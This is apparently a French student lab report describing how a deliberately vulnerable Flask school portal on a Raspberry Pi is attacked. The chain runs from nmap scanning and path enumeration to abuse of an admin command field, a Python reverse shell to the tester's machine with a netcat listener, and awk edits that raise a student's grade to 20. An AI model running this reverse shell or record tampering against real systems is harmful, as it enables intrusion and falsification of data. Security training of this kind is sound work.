 TP_BTS – Compte rendu du TP – Reverse shell sur l’ENT Ingetis

Introduction


Ce TP avait pour objectif d’analyser et d’exploiter une application web Flask simulant un ENT Ingetis, hébergée sur un Raspberry Pi, afin d’obtenir un accès système (reverse shell) et de modifier une note dans un fichier CSV.

​

Mon poste de travail tournait sous Arch Linux avec l’adresse IP 172.16.2.40, et la machine cible (Raspberry Pi) avait l’adresse IP 172.16.1.45.


​

1. Découverte du réseau et de la cible

1.1 Identification de mon réseau local


Pour commencer, j’ai affiché la configuration réseau de ma machine afin d’identifier mon IP et la plage réseau utilisée.


​


bash

ip a


Cette commande m’a permis de voir que mon interface wlan0 possédait l’adresse IP 172.16.2.40/12, ce qui indique une plage de réseau très large (172.16.0.0 à 172.31.255.255).


​

1.2 Mauvaise utilisation initiale de nmap (échec)


J’ai d’abord tenté un scan avec une mauvaise option :


​


bash

sudo nmap -sp 172.16.2.40


Nmap a renvoyé une erreur car l’option -sp n’existe pas pour un ping scan, l’option correcte est -sn.


​

1.3 Scan ping large pour trouver la Raspberry (succès mais inefficace)


Ensuite, j’ai lancé un scan ping sur tout le /12 :


​


bash

sudo nmap -sn 172.16.0.0/12


Le scan a été très long, mais il a finalement listé de nombreuses machines, dont la Raspberry Pi identifiée par son adresse MAC “Raspberry Pi Trading” et l’IP 172.16.1.45.


​

2. Scan de ports et identification des services


Une fois l’IP de la cible trouvée, j’ai lancé un scan complet des ports TCP avec détection de services.


​


bash

sudo nmap -sV -p- 172.16.1.45


Résultat important :


​


    22/tcp open ssh (OpenSSH 9.4p1 Debian)


    7552/tcp open http (Werkzeug httpd 2.3.7 / Python 3.11.6)


J’en ai déduit que l’ENT était accessible via HTTP sur le port 7552, à l’URL :


​


text

http://172.16.1.45:7552/


3. Énumération des répertoires de l’application web

3.1 Tentatives avec dirsearch et curl (échecs)


J’ai tenté d’utiliser dirsearch pour découvrir des chemins cachés, mais l’outil n’était pas installé et l’installation via AUR a échoué.


​


bash

dirsearch -u http://172.16.1.45:7552 -e html,php,txt,js

# → zsh: command not found: dirsearch


De même, curl n’était pas disponible au début :


​


bash

curl -I http://172.16.1.45:7552/login

# → zsh: command not found: curl


Ces commandes ont échoué car les outils n’étaient pas installés sur l’Arch Linux.


​

3.2 Scan avec Nuclei (succès partiel)


J’ai utilisé nuclei pour détecter des technologies et endpoints courants.


​


bash

nuclei -u http://172.16.1.45:7552


Nuclei a détecté que le serveur utilisait Python/Werkzeug, mais n’a pas trouvé directement la page de login/admin.


​

3.3 Script d’énumération avec wget (succès)


Comme dirsearch et curl posaient problème, j’ai écrit un script Bash pour tester une wordlist de chemins avec wget et enregistrer les résultats dans un fichier.


​


bash

#!/bin/bash

TARGET="http://172.16.1.45:7552"

WORDLIST="/tmp/common.txt"

OUTPUT="scan_result.txt"


echo "[*] Téléchargement de la wordlist…"

wget -qO- https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt > "$WORDLIST"


echo "[*] Scan en cours sur $TARGET …"

echo "Résultats du scan pour $TARGET" > "$OUTPUT"

echo "-------------------------------------------" >> "$OUTPUT"


while read -r p; do

    RESULT=$(wget -S --spider "$TARGET/$p" 2>&1 | grep "HTTP/")

    if [[ ! -z "$RESULT" ]]; then

        echo "[FOUND] $p => $RESULT"

        echo "[FOUND] $p => $RESULT" >> "$OUTPUT"

    fi

done < "$WORDLIST"


echo "[*] Scan terminé. Résultats dans : $OUTPUT"


Après l’avoir rendu exécutable (chmod +x scan_pages.sh) et exécuté (./scan_pages.sh), j’ai obtenu notamment :


​


text

[FOUND] doc       => HTTP/1.1 200 OK

[FOUND] login     => HTTP/1.1 200 OK

[FOUND] static    => HTTP/1.1 200 OK

[FOUND] templates => HTTP/1.1 200 OK


Ces résultats correspondent à une structure Flask classique (doc, login, static, templates).


​

4. Accès à la page de login et interface admin

4.1 Construction et test de l’URL de login


À partir du scan, j’ai testé l’URL suivante dans le navigateur :


​


text

http://172.16.1.45:7552/login


En utilisant les identifiants fournis dans le TP :


​


text

username = admin_ingetis

password = admin_pass_ingetis


J’ai pu me connecter à l’interface d’administration de l’ENT.


​

4.2 Récupération du HTML de la page admin (ligne de commande)


Après installation de curl, j’ai récupéré la page admin avec les identifiants :


​


bash

curl 'http://172.16.1.45:7552/login' \

  -X POST \

  -H 'Content-Type: application/x-www-form-urlencoded' \

  --data 'username=admin_ingetis&password=admin_pass_ingetis'


La réponse HTML contenait :


​


    Un formulaire avec un champ texte name="command" et un bouton Run (interface de commande administrateur).


    Un tableau affichant les notes des étudiants de BTS CIEL, généré avec Jinja2.


Cela montrait que l’application possédait une pseudo “webshell” côté admin, où les commandes saisies sont exécutées côté serveur.


​

5. Découverte du CSV des notes via /doc et commandes système

5.1 Accès à la documentation /doc


J’ai ensuite ouvert la route /doc dans le navigateur :


​


text

http://172.16.1.45:7552/doc


Cette page documentait l’application et faisait apparaître un fichier CSV de notes accessible côté serveur.


​

5.2 Utilisation du champ command pour lire le CSV


Dans le champ command de l’interface admin, j’ai saisi :


​


bash

cat doc/liste_etudiants.csv


La sortie était un fichier CSV avec séparateur ; du type :


​


text

nom;prénom;moyenne_generale

BTS CIEL;ABDELMALEK Walid;9.09

...

BTS CIEL;JOBLON Keran;9.18

...

BTS CIEL;THIBAULT Aymeric;n'attend que des 20 dans cette colonne


J’ai confirmé que la ligne qui m’intéressait était celle de “JOBLON Keran” avec la note 9.18.


​

6. Reverse shell sur le Raspberry

6.1 Choix des IP et du port


    Machine attaquante (mon PC) : 172.16.2.40


    Machine cible (Raspberry) : 172.16.1.45


    ​


J’ai choisi un port arbitraire libre pour le reverse shell, par exemple 4444.


​

6.2 Mise en écoute sur ma machine


Sur mon Arch Linux, j’ai ouvert un listener avec ncat (ou nc) :


​


bash

ncat -lvnp 4444

# ou

nc -lvnp 4444


Cette commande met ma machine en écoute sur le port 4444 en attente d’une connexion entrante.


​

6.3 Reverse shell Python exécuté sur le Raspberry


Depuis le contexte du TP, j’ai exécuté (via la vulnérabilité prévue) un reverse shell Python sur le Raspberry :


​


python

import socket, os, pty

s = socket.socket()

s.connect(("172.16.2.40", 4444))

os.dup2(s.fileno(), 0)

os.dup2(s.fileno(), 1)

os.dup2(s.fileno(), 2)

pty.spawn("/bin/sh")


Lorsque ce script s’exécute sur le Raspberry, ma session ncat reçoit un shell /bin/sh distant.


​

6.4 Problèmes pratiques : nano peu utilisable en reverse shell


En reverse shell, l’utilisation d’éditeurs interactifs comme nano est possible mais très compliquée (problèmes d’affichage, touches, pas de vrai TTY complet).

​

Pour cette raison, j’ai privilégié des outils non interactifs (cat, awk, sed) pour éditer le fichier CSV, plutôt que d’essayer de l’ouvrir dans nano.


​

7. Navigation sur le système cible et localisation du CSV


Une fois le shell obtenu sur le Raspberry, j’ai utilisé les commandes de base Linux vues dans le cours.


​

7.1 Découverte des fichiers de l’application


bash

pwd

ls


Résultat :


​


text

app.py

app_copie.py

doc

static

templates

venv

__pycache__


Cela confirme la structure typique d’une appli Flask avec doc, static, templates et les fichiers Python.


​

7.2 Accès au répertoire doc et au CSV


bash

cd doc

ls

cat liste_etudiants.csv


La commande cat a à nouveau affiché le contenu du CSV, confirmant le format et la présence de la ligne “BTS CIEL;JOBLON Keran;9.18”.


​

8. Tentatives de modification de la note (échecs et explications)

8.1 Tentatives avec sed (échec)


Première idée : utiliser sed -i pour modifier la note en place.


​


bash

sed -i 's/9.18/20/' liste_etudiants.csv

grep "JOBLON Keran" liste_etudiants.csv


La note restait à 9.18, et d’autres variantes n’ont pas fonctionné :


​


bash

sed -i 's;9.18;20;' liste_etudiants.csv

sed -i 's/9.18/20/' doc/liste_etudiants.csv


Ces échecs peuvent s’expliquer par :


​


    Comportement différent de sed -i selon la version (GNU vs BusyBox).


    Problème d’écriture en place sur ce système ou dans ce répertoire.


8.2 Tentatives avec des redirections simples (échec)


J’ai testé la création de fichiers via redirection :


​


bash

echo "test" > test.txt

cat liste_etudiants.csv | sed 's/9.18/20/' > new.csv


Après ls et cat, certains fichiers attendus n’apparaissaient pas ou n’étaient pas modifiés, ce qui montre que, dans certains contextes (via le champ de commande web), les redirections peuvent être filtrées ou bloquées.


​

8.3 Tentatives Python complexes (échec dans l’interface web)


Côté interface web (champ command), j’ai tenté des scripts Python multi-lignes (heredoc) pour modifier le CSV, par exemple :


​


bash

python3 - << 'EOF'

import csv

...

EOF


Ou des one-liners très longs avec python3 -c.

Ces tentatives ont échoué à cause de :


​


    L’interface n’acceptait pas les heredocs (<< EOF).


    Les commandes multi-lignes n’étaient pas supportées.


    La complexité des échappements et de exec() dans une seule ligne.


9. Solution fonctionnelle avec awk

9.1 Première tentative awk basée sur le numéro de ligne (échec)


J’ai tenté d’utiliser awk en me basant sur le numéro de ligne supposé (par exemple NR==10 pour Keran) :


​


bash

awk -F';' 'NR==1{print} NR==10{$3="20";print} NR!=10{print}' liste_etudiants.csv > temp.csv && mv temp.csv liste_etudiants.csv


Mais, à cause d’un possible décalage de numérotation (lignes vides, encodage, etc.), la modification ne s’est pas appliquée à la bonne ligne.


​

9.2 Commande awk finale par motif (succès)


La solution fiable a été d’utiliser un motif sur le nom “JOBLON Keran” plutôt que le numéro de ligne.


​


Commande pour changer la note de Keran à 20 :


bash

awk -F';' 'BEGIN{OFS=";"} /JOBLON Keran/ {$3="20"} {print}' liste_etudiants.csv > tmp.csv && mv tmp.csv liste_etudiants.csv


Explication :


​


    -F';' : définit ; comme séparateur de champs en entrée.


    BEGIN{OFS=";"} : définit ; comme séparateur de champs en sortie.


    /JOBLON Keran/ : sélectionne les lignes contenant cette chaîne.


    {$3="20"} : remplace la 3ᵉ colonne (moyenne) par 20.


    {print} : imprime toutes les lignes (modifiées ou non).


    > tmp.csv && mv tmp.csv liste_etudiants.csv : écrit dans un fichier temporaire puis remplace le fichier original.


Vérification :


​


bash

grep "JOBLON Keran" liste_etudiants.csv


Résultat attendu :


​


text

BTS CIEL;JOBLON Keran;20


La note est bien passée de 9.18 à 20.


​

9.3 Modification bonus du nom (succès)


Ensuite, j’ai aussi testé la modification du nom affiché pour vérifier ma compréhension.


​


Commande pour remplacer “JOBLON Keran” par “Dictateur” :


bash

awk -F';' 'BEGIN{OFS=";"} /JOBLON Keran/ {$2="Dictateur"} {print}' liste_etudiants.csv > tmp.csv && mv tmp.csv liste_etudiants.csv


Ici, $2 correspond à la colonne contenant le nom/prénom.


​


Vérification :


​


bash

grep "Dictateur" liste_etudiants.csv


Résultat :


​


text

BTS CIEL;Dictateur;20


Cela prouve que la ligne a bien été modifiée avec le nouveau nom et la nouvelle note.


​

10. Vérification finale dans l’ENT


Après modification du CSV côté serveur, j’ai rechargé la page de l’ENT dans le navigateur (http://172.16.1.45:7552/login, puis interface admin).

​

La note affichée pour la ligne correspondant à mon entrée était désormais 20/20, et le nom affiché correspondait aux modifications effectuées.


​

11. Limites rencontrées : éditeurs et commandes en reverse shell


Dans le reverse shell, j’ai constaté que :


​


    nano n’était pas confortable (problèmes de TTY, touches, rafraîchissement écran).


    Les commandes sed -i et certaines redirections > ne fonctionnaient pas comme prévu (permissions, environnement restreint, comportement spécifique du shell ou du TP).


    Les scripts Python multi-lignes et les heredocs n’étaient pas supportés dans le champ command de l’interface web.


Ces contraintes m’ont amené à privilégier des outils comme cat, grep et surtout awk, qui fonctionnent en une seule ligne et sans interaction, ce qui est idéal en reverse shell.


​

12. Récapitulatif des commandes clés

12.1 Commandes qui ont fonctionné


Découverte réseau & services :


​


bash

ip a

sudo nmap -sn 172.16.0.0/12

sudo nmap -sV -p- 172.16.1.45


Énumération de chemins web :


​


bash

./scan_pages.sh   # script utilisant wget + SecLists

# Résultats : /doc, /login, /static, /templates


Reverse shell & navigation :


​


bash

ncat -lvnp 4444                # listener sur ma machine


# côté Raspberry, reverse shell Python

import socket,os,pty

s=socket.socket()

s.connect(("172.16.2.40",4444))

os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)

pty.spawn("/bin/sh")


cd doc

ls

cat liste_etudiants.csv


Modification de la note avec awk (succès) :


​


bash

awk -F';' 'BEGIN{OFS=";"} /JOBLON Keran/ {$3="20"} {print}' liste_etudiants.csv > tmp.csv && mv tmp.csv liste_etudiants.csv


Modification du nom avec awk (succès) :


​


bash

awk -F';' 'BEGIN{OFS=";"} /JOBLON Keran/ {$2="Dictateur"} {print}' liste_etudiants.csv > tmp.csv && mv tmp.csv liste_etudiants.csv


12.2 Commandes qui n’ont pas fonctionné (et pourquoi)


Mauvaise option nmap :


​


bash

sudo nmap -sp 172.16.2.40   # option invalide (-sn est correct)


Outils non installés initialement :


​


bash

dirsearch -u http://172.16.1.45:7552 -e html,php,txt,js  # dirsearch absent

curl -I http://172.16.1.45:7552/login                    # curl absent au début


Modifications avec sed -i (aucune modification visible) :


​


bash

sed -i 's/9.18/20/' liste_etudiants.csv

sed -i 's;9.18;20;' liste_etudiants.csv


Causes possibles : comportement spécifique de sed -i et/ou restrictions d’écriture.


​


Scripts Python multi-lignes dans l’interface web (erreurs) :


​


bash

python3 - << 'EOF'

import csv

...

EOF


L’interface ne supportait pas les heredocs et les multi-lignes.


​


Redirections dans le contexte web (échec) :


​


bash

echo "test" > doc/test.txt

cat doc/liste_etudiants.csv | sed 's/9.18/20/' > doc/new.csv


Dans certains cas côté web, les redirections semblaient bloquées ou non prises en compte.


​

Conclusion


Dans ce TP, j’ai suivi une démarche complète :


​


    Reconnaissance réseau (nmap) pour trouver la Raspberry Pi et ses services.


    Énumération des routes Flask (/doc, /login, /static, /templates) avec un script basé sur wget et SecLists.


    Connexion à l’interface admin, exploitation d’un champ de commande permettant un reverse shell.


    Obtention d’un shell sur le Raspberry, exploration du système Linux et identification du fichier liste_etudiants.csv.


    Multiples tentatives de modification (sed, Python, redirections) qui ont échoué dans ce contexte particulier.


    Utilisation d’awk pour modifier proprement la ligne de “JOBLON Keran” en mettant la note à 20 et en changeant le nom, avec vérification dans le fichier et dans l’ENT.


Même si nano était difficile à utiliser en reverse shell, l’utilisation d’outils en ligne de commande non interactifs (en particulier awk) m’a permis d’atteindre l’objectif du TP et de comprendre en détail la chaîne complète : découverte, exploitation, reverse shell, manipulation de fichiers et modification des données affichées par l’application web. 
